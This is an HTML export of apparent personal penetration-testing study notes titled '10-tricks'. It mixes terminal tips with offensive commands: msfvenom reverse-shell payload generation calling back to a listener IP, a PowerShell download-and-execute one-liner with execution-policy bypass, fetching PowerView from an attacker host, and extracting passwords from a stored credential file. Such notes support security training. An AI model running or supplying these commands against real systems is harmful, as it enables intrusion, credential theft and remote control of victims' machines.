<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>10-tricks</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>10-tricks</h1><br/><p><h2>Enlarge terminal buffer</h2><ul><li>screen -h 5000</li><li><code>Ctrl</code>+<code>A</code>,<code>Esc</code> also enters the copy/scrollback mode.</li><li>esc  to abort </li></ul></p><p></p><p></p><p><h2>Common commands for privesc</h2></p><p><ul><li>Invoke-WebRequest -URI <a href="http://192.168.119.146/powerview.ps1">http://192.168.119.146/powerview.ps1</a> -OutFile powerview.ps1</li><li>msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.147 LPORT=443 EXITFUNC=thread -f aspx -o shell.aspx</li></ul></p><p></p><p>Retrieve passwords from session after pass the hash</p><p><ul><li>PowerShell has a method for storing encrypted credentials that can only be accessed by the user account that stored them. To retrieve the credential and using it within a script, you read it from the XML file. We will use this method to get the user’s hash</li></ul></p><p>PS C:\Users\lvetrova&gt; $Credential = Import-Clixml -Path &quot;lvetrova.xml&quot;</p><p></p><p>PS C:\Users\lvetrova&gt; $Credential.GetNetworkCredential().password</p><p></p><p></p><p></p><p>Screenshot to clipboard</p><p></p><p><ul><li>shift + ctrl + printSCreen</li></ul></p><p></p><p></p><p>Compress directory in order to upload it </p><p><ul><li>Compress-Archive -Path &lt;directory&gt; -DestinationPath 1.zip</li></ul></p><p></p><p></p><p></p><p><h2>Better shell</h2></p><p><ul><li>msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=443 EXITFUNC=thread -f exe -o shell.exe</li><li>powershell -ep bypass -c &quot;iex(iwr -uri http://$lhost/pwn.ps1 ) -usebasicparsing</li><li>pwn.ps1<ul><li></li></ul></li></ul><img src="images/376-1.png" alt="images/376-1.png" /></p></div>
</body>
</html>
